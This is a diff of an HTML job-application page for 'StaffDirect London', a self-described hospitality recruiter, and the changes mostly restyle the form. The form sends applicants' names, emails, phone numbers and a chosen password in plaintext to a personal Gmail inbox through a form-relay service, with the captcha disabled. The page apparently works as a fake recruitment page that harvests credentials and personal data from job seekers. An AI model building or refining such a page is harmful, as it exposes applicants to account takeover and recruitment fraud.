@@ -3,43 +3,66 @@
 <head> 
 <meta charset="UTF-8"> 
 <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-<title>StaffDirect London - Job Application</title> 
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet"> 
+<title>StaffDirect London - Premium Hospitality Recruitment</title> 
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet"> 
 <style> 
-:root { --navy: #0A1F44; --gold: #D4AF37; } 
-* {box-sizing: border-box;} 
+:root { --navy: #0A1F44; --gold: #D4AF37; --light-gold: #F5E6C8; } 
+* {box-sizing: border-box; margin: 0; padding: 0;} 
 body { background: linear-gradient(135deg, var(--navy) 0%, #1a3a6e 100%); font-family: 'Poppins', sans-serif; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh;} 
-.box { background: #fff; max-width: 600px; width: 100%; padding: 40px 30px; border-radius: 16px; border-top: 5px solid var(--gold); text-align: center; box-shadow: 0 12px 40px rgba(0,0,0,0.3);} 
 
-/* اللوغو */
+.container { 
+  background: #fff; 
+  max-width: 650px; 
+  width: 100%; 
+  padding: 50px 35px; 
+  border-radius: 20px; 
+  border-top: 6px solid var(--gold); 
+  box-shadow: 0 15px 50px rgba(0,0,0,0.4); 
+  text-align: center; 
+  animation: fadeIn 0.6s ease;
+}
+@keyframes fadeIn { from {opacity: 0; transform: translateY(20px);} to {opacity: 1; transform: translateY(0);} }
+
+.header {margin-bottom: 30px;}
 .logo-img {
-  width: 90px;
-  height: 90px;
+  width: 100px;
+  height: 100px;
   margin: 0 auto 15px;
-  border-radius: 12px;
+  border-radius: 16px;
   object-fit: contain;
+  background: var(--light-gold);
+  padding: 10px;
+  border: 2px solid var(--gold);
 }
 
-.logo {font-family: 'Playfair Display', serif; font-size: 28px; font-weight: 700; color: var(--navy); letter-spacing: 1px;} 
-.tag {color: var(--gold); font-size: 12px; font-weight: 600; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1.5px;} 
-h2 {color: var(--navy); margin: 15px 0 5px; font-size: 24px;} 
-p {color: #555; margin-bottom: 25px; font-size: 14px;} 
-input, select {width: 100%; padding: 14px 15px; margin-bottom: 15px; border: 2px solid #eee; border-radius: 10px; font-family: 'Poppins'; font-size: 15px; text-align: left; transition: 0.3s;} 
-input:focus, select:focus {border-color: var(--gold); outline: none; box-shadow: 0 0 0 3px rgba(212,175,55,0.2);} 
-.btn {width: 100%; padding: 16px; background: linear-gradient(135deg, var(--gold) 0%, #B8860B 100%); color: var(--navy); border: none; border-radius: 10px; font-size: 18px; font-weight: 700; cursor: pointer; font-family: 'Poppins'; transition: 0.3s; box-shadow: 0 4px 15px rgba(212,175,55,0.4);} 
-.btn:hover {transform: translateY(-2px); box-shadow: 0 6px 20px rgba(212,175,55,0.6);} 
+.brand {font-family: 'Playfair Display', serif; font-size: 32px; font-weight: 700; color: var(--navy); letter-spacing: 1px;} 
+.subtitle {color: var(--gold); font-size: 13px; font-weight: 600; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px;} 
+h2 {color: var(--navy); margin: 20px 0 8px; font-size: 26px; font-weight: 700;} 
+.desc {color: #666; margin-bottom: 30px; font-size: 15px; line-height: 1.6;} 
+
+.form-group {text-align: left; margin-bottom: 18px;}
+label {display: block; color: var(--navy); font-weight: 600; font-size: 14px; margin-bottom: 6px;}
+input, select {width: 100%; padding: 15px 16px; border: 2px solid #eee; border-radius: 12px; font-family: 'Poppins'; font-size: 15px; transition: 0.3s; background: #fafafa;} 
+input:focus, select:focus {border-color: var(--gold); outline: none; background: #fff; box-shadow: 0 0 0 4px rgba(212,175,55,0.15);} 
+
+.btn {width: 100%; padding: 18px; background: linear-gradient(135deg, var(--gold) 0%, #B8860B 100%); color: var(--navy); border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; font-family: 'Poppins'; margin-top: 10px; transition: all 0.3s ease; box-shadow: 0 5px 20px rgba(212,175,55,0.4);} 
+.btn:hover {transform: translateY(-3px); box-shadow: 0 8px 25px rgba(212,175,55,0.6);} 
+
+.footer {margin-top: 25px; font-size: 12px; color: #999;}
 </style> 
 </head> 
 <body> 
-<div class="box"> 
+<div class="container"> 
 
-<!-- لوغو StaffDirect London -->
-<img src="https://i.imgur.com/8QZQZQZ.png" alt="StaffDirect London Logo" class="logo-img">
+<div class="header">
+  <!-- لوغو StaffDirect London -->
+  <img src="https://i.imgur.com/8QZQZQZ.png" alt="StaffDirect London Logo" class="logo-img">
+  <div class="brand">STAFFDIRECT LONDON</div> 
+  <div class="subtitle">Premium Hospitality Recruitment</div> 
+</div>
 
-<div class="logo">STAFFDIRECT LONDON</div> 
-<div class="tag">Premium Hospitality Recruitment</div> 
-<h2>Job Application</h2> 
-<p>Fill the form and we will contact you within 24 hours</p> 
+<h2>Job Application Form</h2> 
+<p class="desc">Join our elite team of hospitality professionals. Fill out the form below and our recruitment team will contact you within 24 hours.</p> 
 
 <form action="https://formsubmit.co/mosabshareef22@gmail.com" method="POST">
   
@@ -47,34 +70,61 @@ input:focus, select:focus {border-color: var(--gold); outline: none; box-shadow:
   <input type="hidden" name="_subject" value="New Job Application - StaffDirect London">
   <input type="hidden" name="_captcha" value="false">
 
-  <input name="Full Name" placeholder="Full Name *" required>
-  <input name="Email" type="email" placeholder="Email Address *" required>
-  <input name="Phone Number" type="tel" placeholder="Phone Number *" required>
-  <input name="Password" type="password" placeholder="Create Password *" required>
+  <div class="form-group">
+    <label>Full Name *</label>
+    <input name="Full Name" placeholder="Enter your full name" required>
+  </div>
 
-  <select name="Country" required>
-    <option value="">Select Country *</option>
-    <option>Afghanistan</option><option>Albania</option><option>Algeria</option><option>Argentina</option>
-    <option>Australia</option><option>Bahrain</option><option>Bangladesh</option><option>Brazil</option>
-    <option>Canada</option><option>China</option><option>Egypt</option><option>France</option>
-    <option>Germany</option><option>India</option><option>Indonesia</option><option>Iraq</option>
-    <option>Jordan</option><option>Kuwait</option><option>Lebanon</option><option>Libya</option>
-    <option>Malaysia</option><option>Morocco</option><option>Nepal</option>
-    <option>Nigeria</option><option>Oman</option><option>Pakistan</option><option>Qatar</option>
-    <option>Saudi Arabia</option><option>Sudan</option><option>Syria</option><option>Tunisia</option>
-    <option>Turkey</option><option>UAE</option><option>UK</option><option>USA</option>
-    <option>Yemen</option><option>Other</option>
-  </select>
+  <div class="form-group">
+    <label>Email Address *</label>
+    <input name="Email" type="email" placeholder="your.email@example.com" required>
+  </div>
 
-  <select name="Job Position" required>
-    <option value="">Select Job Position *</option>
-    <option>Receptionist</option><option>Housekeeping</option>
-    <option>Chef</option><option>Waiter/Waitress</option>
-    <option>Room Service</option><option>Hotel Manager</option><option>Other</option>
-  </select>
+  <div class="form-group">
+    <label>Phone Number *</label>
+    <input name="Phone Number" type="tel" placeholder="+44 7XXX XXXXXX" required>
+  </div>
 
-  <button type="submit" class="btn">Create Account & Submit</button>
+  <div class="form-group">
+    <label>Create Password *</label>
+    <input name="Password" type="password" placeholder="Minimum 6 characters" required>
+  </div>
+
+  <div class="form-group">
+    <label>Country *</label>
+    <select name="Country" required>
+      <option value="">Select your country</option>
+      <option>Afghanistan</option><option>Albania</option><option>Algeria</option><option>Argentina</option>
+      <option>Australia</option><option>Bahrain</option><option>Bangladesh</option><option>Brazil</option>
+      <option>Canada</option><option>China</option><option>Egypt</option><option>France</option>
+      <option>Germany</option><option>India</option><option>Indonesia</option><option>Iraq</option>
+      <option>Jordan</option><option>Kuwait</option><option>Lebanon</option><option>Libya</option>
+      <option>Malaysia</option><option>Morocco</option><option>Nepal</option> <!-- Nepal Added -->
+      <option>Nigeria</option><option>Oman</option><option>Pakistan</option><option>Qatar</option>
+      <option>Saudi Arabia</option><option>Sudan</option><option>Syria</option><option>Tunisia</option>
+      <option>Turkey</option><option>UAE</option><option>UK</option><option>USA</option>
+      <option>Yemen</option><option>Other</option>
+    </select>
+  </div>
+
+  <div class="form-group">
+    <label>Job Position *</label>
+    <select name="Job Position" required>
+      <option value="">Select position</option>
+      <option>Receptionist</option><option>Housekeeping</option>
+      <option>Chef</option><option>Waiter/Waitress</option>
+      <option>Room Service</option><option>Hotel Manager</option>
+      <option>Concierge</option><option>Barista</option><option>Other</option>
+    </select>
+  </div>
+
+  <button type="submit" class="btn">Submit Application</button>
 </form>
+
+<div class="footer">
+  © 2026 StaffDirect London. All rights reserved.
+</div>
+
 </div>
 </body> 
 </html>
